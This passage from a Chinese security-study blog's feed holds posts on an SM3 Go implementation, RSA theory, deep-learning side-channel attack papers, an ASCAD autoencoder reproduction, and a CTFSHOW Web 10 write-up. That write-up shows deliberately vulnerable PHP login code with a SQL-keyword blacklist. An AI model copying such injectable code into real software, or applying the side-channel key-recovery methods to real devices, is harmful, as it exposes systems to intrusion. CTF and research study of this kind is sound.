class="type">int64</span> &#123;</span><br><span class="line">	tempData := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> data &#123;</span><br><span class="line">		num, _ := strconv.ParseInt(<span class="type">string</span>(v), <span class="number">16</span>, <span class="number">64</span>)</span><br><span class="line">		num4 := strconv.FormatInt(num, <span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span> <span class="built_in">len</span>(num4) &lt; <span class="number">4</span> &#123;</span><br><span class="line">			num4 = <span class="string">&quot;0&quot;</span> + num4</span><br><span class="line">		&#125;</span><br><span class="line">		tempData += num4</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">len</span>(tempData) &lt; <span class="number">32</span> &#123;</span><br><span class="line">		tempData = <span class="string">&quot;0&quot;</span> + tempData</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> l != <span class="number">0</span> &#123;</span><br><span class="line">		tempData = tempData[l:] + tempData[:l]</span><br><span class="line">	&#125;</span><br><span class="line">	tempRes := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i*<span class="number">4</span> &lt; <span class="built_in">len</span>(tempData); i++ &#123;</span><br><span class="line">		tData := tempData[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">1</span>] + tempData[i*<span class="number">4</span>+<span class="number">1</span>:i*<span class="number">4</span>+<span class="number">2</span>] + tempData[i*<span class="number">4</span>+<span class="number">2</span>:i*<span class="number">4</span>+<span class="number">3</span>] + tempData[i*<span class="number">4</span>+<span class="number">3</span>:i*<span class="number">4</span>+<span class="number">4</span>]</span><br><span class="line">		tem, _ := strconv.ParseInt(tData, <span class="number">2</span>, <span class="number">64</span>)</span><br><span class="line">		tempRes += strconv.FormatInt(tem, <span class="number">16</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	res, _ := strconv.ParseInt(tempRes, <span class="number">16</span>, <span class="number">64</span>)</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	originData := MsgFilling(<span class="string">&quot;abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd&quot;</span>)</span><br><span class="line">	<span class="keyword">var</span> originV = []<span class="type">string</span>&#123;<span class="string">&quot;7380166f&quot;</span>, <span class="string">&quot;4914b2b9&quot;</span>, <span class="string">&quot;172442d7&quot;</span>, <span class="string">&quot;da8a0600&quot;</span>, <span class="string">&quot;a96f30bc&quot;</span>, <span class="string">&quot;163138aa&quot;</span>, <span class="string">&quot;e38dee4d&quot;</span>, <span class="string">&quot;b0fb0e4e&quot;</span>&#125;</span><br><span class="line">	V := <span class="built_in">make</span>([][]<span class="type">string</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	V = <span class="built_in">append</span>(V, originV)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> l := <span class="number">0</span>; l*<span class="number">64</span> &lt; <span class="built_in">len</span>(originData); l++ &#123;</span><br><span class="line">		data := originData[l*<span class="number">64</span> : (l+<span class="number">1</span>)*<span class="number">64</span>]</span><br><span class="line">		w := OrgMsg(data)[<span class="number">0</span>]</span><br><span class="line">		V = <span class="built_in">append</span>(V, msgZip(w, V[l]))</span><br><span class="line">	&#125;</span><br><span class="line">	res := V[<span class="built_in">len</span>(V)<span class="number">-1</span>:]</span><br><span class="line">	final_data := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> res[<span class="number">0</span>] &#123;</span><br><span class="line">		final_data += v</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(final_data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法过程实现</category>
      </categories>
      <tags>
        <tag>国密算法</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA算法理论证明</title>
    <url>/archives/ec4077d8.html</url>
    <content><![CDATA[<h1>原理</h1>
<ol>
<li>选取两个极大的素数p,q</li>
<li>令n=p*q, 则φ(n)=(p-1)(q-1), φ(n)是n的欧拉函数</li>
<li>选取一个与φ(n)互质的数e, e∈(1,φ(n))</li>
<li>计算出e对于φ(n)的模反元素d</li>
<li>M<sup>e</sup>modn = C 这里C就是密文</li>
<li>C<sup>d</sup>modn = M</li>
</ol>
<h2 id="素数-质数">素数/质数</h2>
<p>给定一个素数p, 则除了1与p本身外不存在其他因数</p>
<h2 id="欧拉函数">欧拉函数</h2>
<p>φ(n)表示小于n的正整数且与n互质的数的个数</p>
<p><strong>若n为质数</strong>, 则φ(n) = n-1</p>
<p><strong>若n为两互质的整数之积</strong>, φ(n)=(p-1)(q-1)</p>
<h2 id="模反元素">模反元素</h2>
<p>e与φ(n)互质,则有d, 使得ed-1能被φ(n)整除,即(ed)%φ(n)=1, 此时d称为e对于φ(n)的模反元素,</p>
<h1>算法验证</h1>
<p>由原理第五、第六步可得</p>
<p>C = M<sup>e</sup>modn = (C<sup>d</sup>modn)<sup>e</sup>modn</p>
<p>这里引用了公式  <strong>((a<sup>x</sup>modp)<sup>y</sup>)modp=a<sup>xy</sup>modp</strong></p>
<p>(C<sup>d</sup>modn)<sup>e</sup>modn = C<sup>de</sup>modn</p>
<p>这里d是e对于φ(n)的模反元素</p>
]]></content>
      <categories>
        <category>算法过程分析</category>
      </categories>
      <tags>
        <tag>非对称密码算法</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-To Overfit, Or Not to Overfit: Improving the Performance of Deep Learning-based SCA</title>
    <url>/archives/f423d1e.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Azade Rezaeezade, Guilherme Perin, and Stjepan Picek</strong></p>
</li>
<li>
<p>单位：<strong>Radboud University, The Netherlands; Delft University of Technology, The Netherlands</strong></p>
</li>
<li>
<p>出处：[International Conference on Cryptology in Africa](<a href="https://link.springer.com/conference/africacrypt">https://link.springer.com/conference/africacrypt</a> africacrypt) AFRICACRYPT 2022: <a href="https://link.springer.com/book/10.1007/978-3-031-17433-9">Progress in Cryptology - AFRICACRYPT 2022</a>  pp 397–421</p>
</li>
<li>
<p>标题：<strong>To Overfit, Or Not to Overfit: Improving the Performance of Deep Learning-based SCA</strong></p>
</li>
</ul>
<h1>贡献</h1>
<ol>
<li>增加能量迹条数<strong>并不一定</strong>会增强模型泛化性</li>
<li>模型在某一特定的超参下模型性能没有特别差，则可以添加能量迹来增强泛化能力。</li>
</ol>
<h1>文章内容</h1>
<h2 id="过拟合欠拟合">过拟合欠拟合</h2>
<h3 id="过拟合">过拟合</h3>
<p>一句话，在训练数据上的拟合比测试集拟合性更高，即模型对训练集中的不重要信息敏感</p>
<p>原因：训练样本单一，噪声数据占比过大，模型太复杂</p>
<p>解决方法：正则化，加入Dropout层，Early stopping。Maghrebi[^1]等人的模型中添加了Dropout层防止训练过拟合</p>
<p><strong>欠拟合</strong></p>
<p>模型在训练集上效果就很差</p>
<p>原因：</p>
<h2 id="深度双下潜">深度双下潜</h2>
<p>图1 （a）中展示了偏差、方差用来描述模型欠拟合、过拟合的概念，这里甜蜜点（Sweet Spot）可以看做训练集指标（准确率、LOSS。。。）最优点，在甜蜜点之前增大训练集模型性能会更好，过了这个点之后会在测试集上起相反的作用。右图则表示深度双下潜，一般认为在甜蜜点前后模型性能是单调变化的，但是这里存在一个插值点（Interpolation Point）即模型容量在该点处训练损失平均值降为0，该图说明在出现过拟合情况时，增大模型的容量会使得效果变好，甚至比在甜蜜点处的测试风险更低。</p>
<p><img src="../img/image-20231201214046415.png" alt="图1 训练、测试风险曲线"></p>
<p>对此，作者认为模型参数量与能量迹条数的调试情况应如下：</p>
<ol>
<li>欠参数状态：模型过小，增加训练集条数直到模型性能不再变化。</li>
<li>过参数状态：模型过大，当增加训练集条数时可以改变模型所处的状态，继续添加。</li>
<li>参数临界状态：    模型的容量与能量迹条数相当, 也就是达到了临界值（Critical Regime），增大模型容量会在短时间内导致模型效果变差，但是在达到插值点时（训练损失很少）会二次单向降低测试风险。</li>
</ol>
<p>在临界状态时，作者尝试增大训练集来寻找最佳点，但是更大的训练集也更需要更大的模型来拟合，增大模型参数量会导致插值点右移，因此作者指出在使用较少的数据训练固定大小的模型性能会更好。</p>
<img src="../img/image-20231203160508607.png" alt="图2 DDDP原文解释" style="zoom:80%;" />
<h2 id="侧信道过拟合">侧信道过拟合</h2>
<p>准确率不能作为侧信道的泛化性评估指标，对此，作者对泛化性的计算公式如下：</p>
<img src="../img/image-20231203161856464.png" alt="泛化指标公式" style="zoom:67%;" />
<p>PS: Q是测试集大小，P是第i条能量迹对应的正确标签的概率，y就是对应label，$$y=Sbox(d \oplus k)$$</p>
<p>这里将侧信道次优模型分为三种情况：</p>
<ol>
<li>模型过拟合（准确性接近随机猜测、验证损失持续增加）但是仍然可以正确恢复密钥，由于对大量能量迹进行学习，模型可以对大部分测试集数据进行识别，从而导致猜测熵收敛较快。</li>
<li>模型接近过拟合（准确性持续提高、损失持续减少），可以恢复密钥，具备一定泛化性但并不是最佳泛化模型。</li>
<li>模型接近或已经过拟合，且无法恢复密钥。</li>
</ol>
<h2 id="数据集">数据集</h2>
<table>
<thead>
<tr>
<th>名称</th>
<th>能量迹条数</th>
<th style="text-align:center">Label模型</th>
<th>特征数量</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASCAD Random Key</td>
<td>300000</td>
<td style="text-align:center"><img src="../img/image-20231201220957204.png" alt="image-20231201220957204" style="zoom:30%;" /></td>
<td>250000（本文考虑1400个特征</td>
</tr>
<tr>
<td>AES_HD</td>
<td>50000</td>
<td style="text-align:center"><img src="../img/image-20231201220938003.png" alt="image-20231201220938003" style="zoom:30%;" /></td>
<td>1250</td>
</tr>
<tr>
<td></td>
<td></td>
<td style="text-align:center"></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="攻击步骤">攻击步骤</h2>
<ol>
<li>网格搜索CNN、MLP超参 网格字典在文中第十页，太多了</li>
<li>5w条能量迹训练，十折交叉验证计算猜测熵</li>
<li>保留猜测熵为1的模型超参， 该类模型=”好模型“</li>
<li>分析模acc、ge曲线， 区分如图3所示。</li>
</ol>
<img src="../img/image-20231201221203679.png" alt="图3 过拟合、趋于过拟合曲线图" style="zoom:67%;" />
<ol start="5">
<li>对”好模型“增加训练集条数重新训练，过拟合模型与泛化性较好的模型表现如图4所示。</li>
</ol>
<img src="../img/image-20231201221248528.png" alt="图4 过拟合与倾向过拟合模型猜测熵收敛曲线" style="zoom:67%;" />
<p><strong>模型往往在增大训练集后泛化性会更好（除了在临界状态时前期增加能量迹会使模型出现偏差），这也是主观观点，也符合上面参数量介于临界状态时的解释。</strong></p>
<h1>实验结果</h1>
<h2 id="ASCAD数据集">ASCAD数据集</h2>
<p>TN1-TN4是不同训练集被设置为5w、10w、15w、20w。Params那一列是不同的MLP模型。</p>
<p>在表1中，（a）#6模型随着数据集增大，其猜测熵收敛更快。但是在#13中，可以看到在增加到20w与15w时，收敛曲线并无变化，这里模型参数量为<code>181409</code>能量迹条数在5w时准确性达到97%左右，在20w时下降到60%。按照<strong>梯度双下潜</strong>的说法，模型参数量正处于临界状态。但是仍然不能把所有的现象都按照梯度双下潜来证明，例如#4模型，在5w时准确性达45%，即欠拟合状态，还未达到梯度-偏差模型所述的甜蜜点Sweet Point，但是在增大数据集到10w，20w的时候猜测熵无法收敛到1，却在15w时获得了较好的收敛效果。</p>
<img src="../img/image-20231201221408398.png" alt="表1 MLP" style="zoom:67%;" />
<p><img src="../img/image-20231201221435070.png" alt="图5 增加数据集大小的效果"></p>
<img src="../img/image-20231201221512074.png" alt="image-20231201221512074" style="zoom:67%;" />
<p><img src="../img/image-20231201221531480.png" alt="CNN"></p>
<h2 id="AES-HD数据集">AES_HD数据集</h2>
<p><img src="../img/image-20231201221627303.png" alt="MLP"></p>
<img src="../img/image-20231201221648654.png" alt="MLP with Dropout" style="zoom:67%;" />
<img src="../img/image-20231201221716883.png" alt="更少的参数量对应模型效果" style="zoom:80%;" />
<h1>总结</h1>
<ol>
<li>增大训练集并不一定能使模型泛化性增强。</li>
<li>欠参数化模型在噪声较少的数据集上要比临界以及过参数化模型性能好。</li>
<li>过参数化模型可以训练的容量更多，就一般情况下猜测熵收敛到1的所需能量迹条数更多。</li>
<li>过参数化模型更有可能包括错误的假设。</li>
<li>在临界状态的模型更容易受到超参、训练数据量的影响（不稳定）。</li>
<li>超参数比数据集大小在模型上的影响占的比重更大</li>
</ol>
<p>作者证实了单独增大训练集并不能保证一定会增强模型的性能，且即使是使用Dropout等正则化手段也不一定能保证避免过拟合问题。</p>
<p><strong>有点绕，建议看文献</strong></p>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>模型训练</tag>
      </tags>
  </entry>
  <entry>
    <title>卷积神经网络（CNN）</title>
    <url>/archives/c9b25c16.html</url>
    <content><![CDATA[<h1>CNN结构</h1>
<ul>
<li>输入层: 输入的数据，可以是一维、二维、三维。</li>
<li>卷积层：对输入的数据进行特征提取。</li>
<li>池化层：对卷积层提取到的特征进行下采样 Maxpooling。</li>
<li>全连接层：</li>
</ul>
<img src="../img/image-20230522101056850.png" alt="image-20230522101056850" style="zoom:80%;" />
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>神经网络模型</tag>
      </tags>
  </entry>
  <entry>
    <title>文献实验复现笔记-One Network to rule them all. An autoencoder approach to encode datasets</title>
    <url>/archives/18f5ed2f.html</url>
    <content><![CDATA[<p><strong>前置文章：</strong> <a href="https://i4mhmh.cn/archives/5dad75f5.html">文献阅读笔记</a></p>
<h1>数据集</h1>
<p>第一次处理侧信道攻击的数据集，过程比较坎坷，记录较为详细一点。</p>
<h2 id="ASCAD-fixed-key">ASCAD fixed key</h2>
<blockquote>
<p>数据集介绍：6w条能量迹，700个特征，算法：AES128，采集设备：ATMega8515</p>
</blockquote>
<p>作者选择使用5w条能量迹作为训练集，1w条作为测试集。<a href="https://github.com/ANSSI-FR/ASCAD">能量迹下载地址</a>，解压后的目录如图1所示。</p>
<p><img src="../img/image-20230326222503168.png" alt="图1 数据集目录"></p>
<p><strong>红色框中的文件是后来自己添加的</strong></p>
<p>环境需求：本机<code>Python 3.8.16 </code>， pip <code>h5py, numpy, matplotlib, tensorflow 2, keras</code></p>
<p>Mac电脑配置tf2环境另开一章。</p>
<h3 id="数据集生成">数据集生成</h3>
<p>原始数据集并没有一阶掩码AES128的数据，需要执行对应文件去生成。阅读源码可知输入参数个数为1时将读取params文件内的参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python ASCAD_generate.py &quot;ATMEGA_AES_v1/ATM_AES_v1_fixed_key/example_generate_params&quot;</span><br></pre></td></tr></table></figure>
<p>这里<code>ATMEGA_AES_v1/ATM_AES_v1_fixed_key/example_generate_params</code>是配置参数的文件，内容如下，在生成数据时目前只需要修改<strong>labeled_traces_file</strong>的值，即指定输出能量迹文件地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example_generate_params</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;traces_file&quot;</span> : <span class="string">&quot;ATMEGA_AES_v1/ATM_AES_v1_fixed_key/ASCAD_data/ASCAD_databases/ATMega8515_raw_traces.h5&quot;</span>,</span><br><span class="line"><span class="string">&quot;labeled_traces_file&quot;</span> : <span class="string">&quot;ASCAD_fixed.h5&quot;</span>,</span><br><span class="line"><span class="string">&quot;profiling_index&quot;</span> : [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50000</span>)],</span><br><span class="line"><span class="string">&quot;attack_index&quot;</span> : [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50000</span>,<span class="number">60000</span>)],</span><br><span class="line"><span class="string">&quot;target_points&quot;</span> : [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45400</span>,<span class="number">46100</span>)],</span><br><span class="line"><span class="string">&quot;profiling_desync&quot;</span> : <span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;attack_desync&quot;</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230326224508285.png" alt="图2 成功生成能量迹并写入文件"></p>
<h3 id="报错">报错</h3>
<pre><code>	<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Error: provided file path &#x27;&#x27; does not exist!</span><br><span class="line"></span><br><span class="line">注释掉ASCAD_generate.py的第154行</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">check_file_exists(os.path.dirname(labeled_traces_file))</span></span><br></pre></td></tr></table></figure>
</code></pre>
<p>以此类推，此数据集中生成其他能量迹只需要修改对应param文件中的参数，后续会在<a href="https://i4mhmh.cn/archives/f61244c1.html">基于深度学习的侧信道攻击入门</a>中补充。</p>
<h2 id="ASCAD-fixed-key-with-desynchronization">ASCAD fixed key with desynchronization</h2>
<p>在之前的命令<code>python ASCAD_generate.py</code>直接回车即可生成</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>文件名</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>ASCAD_desync50.h5</td>
</tr>
<tr>
<td>2</td>
<td>ASCAD_desync100.h5</td>
</tr>
</tbody>
</table>
<h2 id="ASCAD-variable-key">ASCAD variable key</h2>
<h2 id="CHESCTF">CHESCTF</h2>
<h2 id="DPAcV42">DPAcV42</h2>
<h1>自编码器</h1>
<p>作者这里采用的是Vanilla AutoEncoder（结构较简单的自编码器）， 文章中将自编码器的Hidden Layer（隐藏层）设置为1层，即无论输入多少维数据，经过Encoder后都降为500层，超参数如表1所示。</p>
<table>
<thead>
<tr>
<th>Hyperparameters</th>
<th>Training values</th>
</tr>
</thead>
<tbody>
<tr>
<td>Optimizer</td>
<td>Adamax</td>
</tr>
<tr>
<td>Epochs</td>
<td>500,700,1000</td>
</tr>
<tr>
<td>Learning_rate</td>
<td>0.01, 0.001, 0.0025</td>
</tr>
<tr>
<td>Batch_size</td>
<td>200, 400</td>
</tr>
<tr>
<td>Shuffle</td>
<td>True</td>
</tr>
</tbody>
</table>
<center><h5>表1 AE超参数</h5></center>
<h2 id="代码实现">代码实现</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Model</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Input, add</span><br><span class="line"><span class="keyword">from</span> keras.layers.core <span class="keyword">import</span> Dense, Dropout, Activation, Flatten, Reshape</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> regularizers</span><br><span class="line"><span class="keyword">from</span> keras.regularizers <span class="keyword">import</span> l2</span><br><span class="line"><span class="keyword">from</span> keras.layers.convolutional <span class="keyword">import</span> Conv2D, MaxPooling2D, UpSampling2D, ZeroPadding2D</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> np_utils</span><br><span class="line"><span class="keyword">import</span> h5py</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = h5py.File(<span class="string">&quot;../../datasets/ASCAD/ASCAD_fixed.h5&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f.keys())</span><br><span class="line">X_train = np.array(f.get(<span class="string">&#x27;Profiling_traces/traces&#x27;</span>))</span><br><span class="line">X_test = np.array(f.get(<span class="string">&#x27;Attack_traces/traces&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(X_train.shape)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构建VAE模型</span></span><br><span class="line">input_size = <span class="number">700</span></span><br><span class="line">hidden_size = <span class="number">500</span></span><br><span class="line">output_size = <span class="number">700</span></span><br><span class="line"></span><br><span class="line">x = Input(shape=(input_size,))</span><br><span class="line">h = Dense(hidden_size, activation=<span class="string">&quot;relu&quot;</span>)(x)</span><br><span class="line">r = Dense(output_size, activation=<span class="string">&quot;sigmoid&quot;</span>)(h)</span><br><span class="line"></span><br><span class="line">autoencoder = Model(inputs=x, outputs=r)</span><br><span class="line">autoencoder.<span class="built_in">compile</span>(optimizer=<span class="string">&quot;adam&quot;</span>, loss=<span class="string">&quot;mse&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 训练</span></span><br><span class="line">epochs = <span class="number">500</span></span><br><span class="line">batch_size = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">history = autoencoder.fit(X_train, X_train,</span><br><span class="line">                          batch_size=batch_size,</span><br><span class="line">                          epochs=epochs, verbose=<span class="number">1</span>,</span><br><span class="line">                          validation_data=(X_test, X_test)</span><br><span class="line">                         )</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.plot(history.history[<span class="string">&#x27;loss&#x27;</span>])</span><br><span class="line">plt.plot(history.history[<span class="string">&#x27;val_loss&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;model loss&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;loss&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;epoch&#x27;</span>)</span><br><span class="line">plt.legend([<span class="string">&#x27;train&#x27;</span>, <span class="string">&#x27;validation&#x27;</span>], loc=<span class="string">&#x27;upper right&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20230327224224012.png" alt="笑嘻了"></p>
<p>这loss？？？</p>
]]></content>
      <tags>
        <tag>文献实验复现</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化漏洞</title>
    <url>/archives/67fa6b69.html</url>
    <content><![CDATA[<h1>CTFSHOW Web 10</h1>
<p>打开网页如下</p>
<p><img src="../img/image-20220720230047366.png" alt="image-20220720230047366"></p>
<ul>
<li>有一个登录跟(取消按钮),点击取消按钮会把源码下载下来如下</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27; order by 1# &#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>可以看到这里过滤掉了<code>select|from|where|join|sleep|and|\s|union|</code>,而且得到flag的条件是</strong><code>$password==$row['password']</code></p>
<p><strong>拿到password需要用到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>o</mi><mi>w</mi><mo>=</mo><mi>m</mi><mi>y</mi><mi>s</mi><mi>q</mi><mi>l</mi><msub><mi>i</mi><mi>f</mi></msub><mi>e</mi><mi>t</mi><mi>c</mi><msub><mi>h</mi><mi>a</mi></msub><mi>s</mi><mi>s</mi><mi>o</mi><mi>c</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">row=mysqli_fetch_assoc(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ro</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">ys</span><span class="mord mathnormal" style="margin-right:0.01968em;">ql</span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">ssoc</span><span class="mopen">(</span></span></span></span>result)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqli_fetch_assoc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// demo</span><br><span class="line">mysqli_fetch_assoc(result);</span><br><span class="line">		返回代表读取行的关联数组。如果结果集中没有更多的行则返回 NULL。</span><br><span class="line">		</span><br><span class="line">取到result那一列所有值返回成一个数组</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>基于深度学习的侧信道攻击指北</title>
    <url>/archives/f61244c1.html</url>
    <content><![CDATA[<blockquote>
<p>本文是关于侧信道攻击入门的指北，不适合未满8岁的人士食用，未成年人请在成年人的陪同下浏览。本人对指北内容概不负责，如有眩晕、呕吐等不适情况请立刻关闭该网页并及时就医。</p>
</blockquote>
<h1>论文（持续补充）</h1>
<blockquote>
<p>这里是本人看过（下载过）的论文，会持续补充。</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">#</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">站内链接</th>
<th style="text-align:center">论文链接</th>
<th style="text-align:center">类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">Study of Deep Learning Techniques for Side-Channel Analysis and Introduction to ASCAD Database</td>
<td style="text-align:center"><a href="https://i4mhmh.cn/archives/c9076169.html">click</a></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2018/053.pdf">link</a></td>
<td style="text-align:center">入门必看</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">One Network to rule them all. An autoencoder approach to encode datasets</td>
<td style="text-align:center"><a href="https://i4mhmh.cn/archives/5dad75f5.html">click</a></td>
<td style="text-align:center"><a href="https://eprint.iacr.org/2022/890">link</a></td>
